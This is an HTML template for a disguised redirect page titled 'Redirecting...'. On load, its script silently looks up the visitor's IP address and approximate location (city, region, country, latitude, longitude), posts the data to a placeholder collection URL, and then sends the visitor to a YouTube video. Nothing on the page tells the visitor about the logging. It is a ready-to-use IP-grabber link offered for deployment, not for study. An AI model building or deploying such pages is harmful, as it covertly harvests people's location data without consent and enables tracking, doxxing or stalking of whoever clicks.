<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <script>
    async function logAndRedirect() {
      const redirectTo = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // <-- your target

      try {
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());

        const payload = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          redirect: redirectTo
        };

        await fetch("YOUR_SCRIPT_URL", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: {
            "Content-Type": "application/json"
          }
        });

      } catch (err) {
        console.error("Error logging data", err);
      }

      // Delay for a second before redirect
      setTimeout(() => window.location.href = redirectTo, 1000);
    }

    window.onload = logAndRedirect;
  </script>
</head>
<body>
  <h2>Redirecting... Please wait</h2>
</body>
</html>
